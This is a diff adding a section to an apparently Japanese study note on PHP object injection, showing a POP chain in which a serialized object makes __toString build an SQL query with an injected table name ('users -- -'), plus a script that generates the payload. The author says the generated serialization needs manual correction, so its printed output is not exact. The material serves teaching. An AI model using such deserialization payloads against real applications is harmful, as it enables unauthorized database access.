@@ -153,6 +153,67 @@ echo serialize($obj1);  // O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code"
 ?input=O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
 ```
 ## POP chain (SQL Injection)
+```php
+<?php
+class Example3{
+   protected $obj;
+
+   function __construct(){
+      // some PHP code...
+   }
+   // Exampleクラスのインスタンスが文字列として呼びだされたときに__toString()を実行
+   function __toString(){
+      if (isset($this->obj)) {
+          // $this->objはインスタンスであるとして、そのインスタンスのgetValueメソッドを実行
+          return $this->obj->getValue();
+      }else{
+          return "__toString else";
+      }
+   }
+}
+
+class SQL_Row_Value
+{
+   private $_table;
+   private $id;
+
+   // some PHP code...
+   // getValue($id)とすると上の__toString内では引数無しで呼び出してるからエラーになる
+   function getValue()
+   {
+      $sql = "SELECT * FROM {$this->_table} WHERE id = ".(int)$this->id;
+      return $sql;
+   }
+}
+
+// これをデシリアライズすればSQLインジェクションができる！
+$user_data = unserialize('O:8:"Example3":1:{s:3:"obj";O:13:"SQL_Row_Value":2:{s:6:"_table";s:10:"users -- -";s:2:"id";i:2;}}');
+echo $user_data;
+
+// 実際に実行されるSQLクエリ
+// SELECT * FROM users -- - WHERE id = 2
+?>
+```
+以下でPayloadを作成するが、細部がうまいこといってないので手動で修正する。   
+```php
+<?php
+class SQL_Row_Value{
+   private $_table ="users -- -";
+}
+
+class Example3{
+   protected $obj;
+
+   function __construct()   {
+      $this->obj = new SQL_Row_Value;
+   }
+}
+
+print (serialize(new Example3));
+
+// O:8:"Example3":1:{s:6:" * obj";O:13:"SQL_Row_Value":1:{s:21:"SQL_Row_Value_table";s:10:"users -- -";}}
+?>
+```
 # 参考
 https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
 基本的な説明。わかりやすい。   
